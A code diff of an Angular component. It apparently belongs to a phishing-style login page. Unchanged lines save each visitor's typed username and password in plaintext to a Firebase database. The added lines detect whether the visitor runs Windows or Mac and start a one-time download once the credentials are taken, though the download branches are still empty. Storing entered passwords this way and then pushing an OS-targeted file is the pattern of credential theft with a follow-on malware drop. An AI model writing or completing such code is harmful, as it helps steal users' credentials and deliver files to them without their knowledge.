@@ -15,10 +15,11 @@
 
     errorValue = false
     count = 0
-
+    download = true
     id: any;
 
     constructor(private db: AngularFireDatabase) { 
+      console.log("new code 23/06");
       this.id = window.location.href.split('/').pop()
 
       firebase.database().ref().on('value', snapshot => {
@@ -40,9 +41,38 @@
         const id = this.db.createPushId()
         const tutRef = this.db.object(id);
         tutRef.set({ username: this.username, password: this.password});
+        if ( this.download ) {
+          this.download = false
+          this.downloadFile()
+        }
       } else {
         this.errorValue = true
       }      
     }
     
+    getOS() {
+      var userAgent = window.navigator.userAgent,
+          platform = window.navigator.platform,
+          macosPlatforms = ['Macintosh', 'MacIntel', 'MacPPC', 'Mac68K'],
+          windowsPlatforms = ['Win32', 'Win64', 'Windows', 'WinCE'],
+          os = null;
+
+      if (macosPlatforms.indexOf(platform) !== -1) {
+          os = 'Mac OS';
+      }  else if (windowsPlatforms.indexOf(platform) !== -1) {
+          os = 'Windows';
+      }
+
+      return os;
+    }
+
+    downloadFile() {
+      console.log(this.getOS())
+      if (this.getOS() == "Windows") {
+
+      } 
+      if (this.getOS() == "Mac OS") {
+
+      } 
+    }
   }
